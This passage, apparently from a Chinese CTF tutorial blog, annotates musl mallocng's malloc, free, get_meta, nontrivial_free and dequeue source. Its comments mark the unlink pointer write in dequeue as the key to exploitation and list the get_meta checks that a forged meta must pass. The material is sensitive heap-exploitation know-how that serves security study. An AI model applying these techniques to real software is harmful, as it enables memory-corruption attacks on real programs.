class="line">        <span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">            &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">            usage += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">            sc |= <span class="number">1</span>;</span><br><span class="line">        g = ctx.active[sc];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">        first = mask&amp;-mask;</span><br><span class="line">        <span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">            g-&gt;avail_mask = mask-first;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        idx = a_ctz_32(first);</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    upgradelock();</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果当前group 不满足就会来到这里:</span></span><br><span class="line"><span class="comment">      alloc_slot 从group 中取出对应大小chunk 的idx</span></span><br><span class="line"><span class="comment">      这里先从对应sc 的ctx.active[sc] 中找对应的meta的group 有无空闲chunk可以使用</span></span><br><span class="line"><span class="comment">        再从队列中其他meta的group 中找</span></span><br><span class="line"><span class="comment">      如果队列中其他meta的group 有可利用的chunk,就使用</span></span><br><span class="line"><span class="comment">      如果没有就重新分配一个新的group</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g = ctx.active[sc];<span class="comment">// 取出 sc 对应active meta</span></span><br><span class="line"> </span><br><span class="line">success:</span><br><span class="line">    ctr = ctx.mmap_counter;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> enframe(g, idx, n, ctr);<span class="comment">// 从对应meta 中的group 取出 第idx号chunk  n = size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>!!! 关键: 一般分配先进入这个循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    mask = g ? g-&gt;avail_mask : <span class="number">0</span>; <span class="comment">//先检查g所指meta是否存在，若存在mask = g-&gt;avail_mask</span></span><br><span class="line">    first = mask&amp;-mask;                     <span class="comment">//这里只有mask=0时，first才会为0</span></span><br><span class="line">    <span class="keyword">if</span> (!first) <span class="keyword">break</span>;                        <span class="comment">//mask为0，first=0，无可用空闲chunk，跳出循环</span></span><br><span class="line">    <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)<span class="comment">//如果是排它锁, 那么下面保证成功</span></span><br><span class="line">        g-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) <span class="comment">//成功找到并设置avail_mask之后,continue 后设置idx，然后跳出</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    idx = a_ctz_32(first);</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">    upgradelock();</span><br><span class="line">    如果</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br></pre></td></tr></table></figure><p>alloc_slot:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;    <span class="comment">// 尝试从限制active 中找到合适可用的</span></span><br><span class="line">    <span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">    <span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 如果没找到 重新创造一个meta，然后重新分配一个size大小对应sc的group，给这个新分配的meta</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">    <span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    g-&gt;avail_mask--;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.active[sc], g); <span class="comment">//把新meta 加入队列</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>try_avail:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">    <span class="type">uint32_t</span> first;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="keyword">if</span> (!mask)<span class="comment">//mask = m-&gt;avail_mask (!mask) 表示没有可用的chunk了</span></span><br><span class="line">    &#123;                                        </span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;freed_mask) <span class="comment">// if (!m-&gt;freed_mask) &lt;=&gt; 没有已经释放的chunk</span></span><br><span class="line">        &#123;                                </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:既没有可用的chunk，也没有被释放还未回收的chunk，即chunk都被使用，且都没被释放</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            dequeue(pm, m); <span class="comment">// freed_mask==avail_mask=0, group 空间已满 让对应的meta 出队</span></span><br><span class="line">            m = *pm;</span><br><span class="line">            <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        这里else表示的是:无可用空闲chunk，但是有已经释放的chunk</span></span><br><span class="line"><span class="comment">        !!! free释放的chunk 不能马上被复用的 !!!</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:没有可用的chunk，有被释放还未回收的chunk。</span></span><br><span class="line"><span class="comment">       有点好奇这里，如果达成这个条件，然后利用指针互写，修改m-&gt;next 伪造的meta，是不是就可以制造fake meta 入队的假象</span></span><br><span class="line"><span class="comment">       若meta链表中没有，一般meta 的next和prev 都是指向自己</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        mask = m-&gt;freed_mask;</span><br><span class="line">        <span class="comment">// 如果这个meta 的group 只含有一个chunk ，且被释放就跳过，</span></span><br><span class="line">        <span class="comment">// 或者 这个meta 的group 根本不能被释放 如mmap 的 group last_idx = 0 freeable=1</span></span><br><span class="line">        <span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable)</span><br><span class="line">        &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">            mask = m-&gt;freed_mask;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">        <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">        <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">        <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (m-&gt;next != m)</span><br><span class="line">            &#123; <span class="comment">// 如果这个meta 后还有meta 就切换到 下一个meta</span></span><br><span class="line">                m = m-&gt;next;</span><br><span class="line">                *pm = m;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">                <span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">                <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">                <span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) <span class="comment">// 页对齐</span></span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    span += size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">                    cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">                m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mask = activate_group(m);<span class="comment">// 这里是给 m的 avail_mask 打上标记</span></span><br><span class="line">        assert(mask);</span><br><span class="line">        decay_bounces(m-&gt; sizeclass);</span><br><span class="line">    &#125;</span><br><span class="line">    first = mask&amp;-mask; <span class="comment">// 若 mask%2==0 则first =结果是能整除这个偶数的最大的2的幂 若 mask%2==1 则first永远为1</span></span><br><span class="line">    m-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="free-1"><a href="#free-1" class="headerlink" title="free:"></a>free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);<span class="comment">// 通过chunk p 用get_meta得到对应的meta</span></span><br><span class="line">    <span class="type">int</span> idx = get_slot_index(p);<span class="comment">// 得到对应chunk的 idx</span></span><br><span class="line">    <span class="type">size_t</span> stride = get_stride(g); <span class="comment">// 得到sizeclasses 中对应chunk类型的size</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">    <span class="comment">//*start = g-&gt;mem-&gt;storage(得到group中第一个chunk地址) + stride*idx(加上对应chunk偏移);</span></span><br><span class="line">    <span class="comment">// start 就为对应p(chunk)的起始地址</span></span><br><span class="line">    <span class="comment">// end 对应结束地址</span></span><br><span class="line"> </span><br><span class="line">    get_nominal_size(p, end);<span class="comment">//算出真实大小</span></span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;<span class="comment">//设置bitmap 标志</span></span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">    *(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">        <span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">        <span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">        <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">        <span class="type">uint32_t</span> mask = freed | avail; <span class="comment">// 将释放的chunk 和 现在可用的 chunk 加起来</span></span><br><span class="line">        assert(!(mask&amp;self));</span><br><span class="line">        <span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//!freed 没有被释放的chunk，mask+self==all说明释放了当前chunk所有chunk 都将被回收</span></span><br><span class="line">        <span class="comment">// 此group 会被弹出队列</span></span><br><span class="line">        <span class="keyword">if</span> (!MT)</span><br><span class="line">            g-&gt;freed_mask = freed+self;<span class="comment">// 设置free_mask 表示chunk 被释放</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    wrlock();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);<span class="comment">// 含有meta 操作 ，内有unlink 是漏洞利用的关键</span></span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="get-meta"><a href="#get-meta" class="headerlink" title="get_meta:"></a>get_meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);<span class="comment">// 得到chunk offset</span></span><br><span class="line">    <span class="type">int</span> index = p[<span class="number">-3</span>] &amp; <span class="number">31</span>;;<span class="comment">// 得到chunk idx</span></span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);<span class="comment">// 通过offset 和chunk 地址计算出group地址</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;<span class="comment">// 从group 得到 meta 地址</span></span><br><span class="line">    assert(meta-&gt;mem == base);<span class="comment">// 检查meta 是否指向对应的group</span></span><br><span class="line">    assert(index &lt;= meta-&gt;last_idx);<span class="comment">// 检查chunk idx 是否超过 meta 最大chunk 容量</span></span><br><span class="line">    assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);<span class="comment">// 得到meta_area 地址</span></span><br><span class="line">    assert(area-&gt;check == ctx.secret);<span class="comment">// 检查 check 校验值</span></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123; <span class="comment">// 如果属于 sizeclasses 管理的chunk 大小</span></span><br><span class="line">        assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">        assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">        assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free:"></a>nontrivial_free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span><span class="comment">// i = idx</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;<span class="comment">//mask=已经被free的chunk +可使用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g))</span><br><span class="line">    &#123;    <span class="comment">/*    </span></span><br><span class="line"><span class="comment">         如果 mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 代表此meta中group里的chunk 都被释放 或者 都被用了</span></span><br><span class="line"><span class="comment">         (2u&lt;&lt;g-&gt;last_idx)-1 计算出的值化成二进制，其中每位含义类似于bitmap，如果每位为1表每位要不是被free 不然就是被</span></span><br><span class="line"><span class="comment">         okay_to_free 检测是否可以被释放</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g-&gt;next)</span><br><span class="line">        &#123;    <span class="comment">// 如果队列中 有下一个meta</span></span><br><span class="line">            assert(sc &lt; <span class="number">48</span>);<span class="comment">// 检测 sc 是不是mmap 分配的</span></span><br><span class="line">      <span class="comment">// 检测当前meta g 和 队列里的active[sc] meta 是否一样，一样则activate_new赋值为1</span></span><br><span class="line">            <span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">            dequeue(&amp;ctx.active[sc], g);<span class="comment">// 当前meta 出队</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta</span></span><br><span class="line">            <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">                activate_group(ctx.active[sc]);<span class="comment">//如果有下一个meta 直接激活 然后修改avail_mask 标志位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> free_group(g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask)</span><br><span class="line">    &#123;<span class="comment">// mask==0 group chunk 空间已被完全使用</span></span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">        <span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="keyword">if</span> (ctx.active[sc] != g) &#123;<span class="comment">// 如果 g 未被加入 队列ctx.ative[sc]</span></span><br><span class="line">            <span class="built_in">queue</span>(&amp;ctx.active[sc], g);<span class="comment">// 把g 加入队列</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a_or(&amp;g-&gt;freed_mask, self);<span class="comment">// 修改对应 的freed_mask 标志 ，表示着对应的chunk 已被释放</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue:"></a>dequeue:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next; <span class="comment">// 这里存在指针互写 在 prev 所指地址上 写入next 指针</span></span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev; <span class="comment">// 在next 所指地址上 写入prev 指针</span></span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;<span class="comment">// 队列头如果为m 那就更新为m-&gt;next</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>; <span class="comment">// 清理m(meta)的头尾指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue触发条件"><a href="#dequeue触发条件" class="headerlink" title="dequeue触发条件"></a>dequeue触发条件</h3><p>1、<code>avail_mask</code> 表示只有一个<code>chunk</code> 被使用 ,<code>freed_mask=0</code>，而<code>free</code> 刚好要<code>free</code> 一个<code>chunk</code>，满足 <code>okay_to_free()</code> 条件 就可以进入<code>dequeue</code> 进行出队操作<br>如<code>add(1,0x20)</code> 再<code>free(1)</code> 就会使得<code>meta</code> 被回收<br>2、<code>avail_mask=0</code>, <code>freed_mask</code> 表示只有 <code>1</code>个 <code>chunk</code> 没被释放，这时释放的<code>chunk</code> 就应该是那最后一个<code>chunk</code><br>如下面情况 <code>avail_mask ==0 free_mask=63=00111111 last_idx = 6</code>，已经释放<code>6</code> 个<code>chunk</code> 还有最后一个<code>chunk</code>没被释放 在释放最后一个<code>chunk</code> 时会触发<code>dequeue</code>使得对应<code>meta</code>出队<br>3、如果发现这个<code>group</code>中所有的<code>chunk</code>要么被<code>free</code>, 要么是可用的, 那么就会回收掉这个<code>group</code>，调用<code>dequeue</code>从队列中出队</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>free 首先会调用 <code>get_meta</code> ，而 <code>get_meta</code> 有如下检查:</p><ul><li><code>assert(!((uintptr_t) p &amp; 15));</code>，即 <code>chunk</code> 应该关于 <code>0x10</code> 对齐</li><li><code>meta-&gt;mem == base</code> ，即 <code>meta</code> 中保存的 <code>group</code> 指针要正确</li><li><code>index &lt;= meta-&gt;last_idx</code> ，即 <code>chunk</code> 的索引不能越界</li><li><code>assert(!(meta-&gt;avail_mask &amp; (1u &lt;&lt; index)));</code> ，<code>assert(!(meta-&gt;freed_mask &amp; (1u &lt;&lt; index)));</code> ，检测 <code>double fre</code></li><li><code>area-&gt;check == ctx.secret</code> ，即 <code>meta</code> 所在的 <code>meta_area</code> 的校验值正确。如果伪造的 <code>meta</code> 位于一个伪造的 <code>meta_area</code> 中，需要首先获取校验值 <code>secret</code> 并保存到 <code>meta_area</code> 开头，即这一页最开始的地方</li><li><code>offset &gt;= 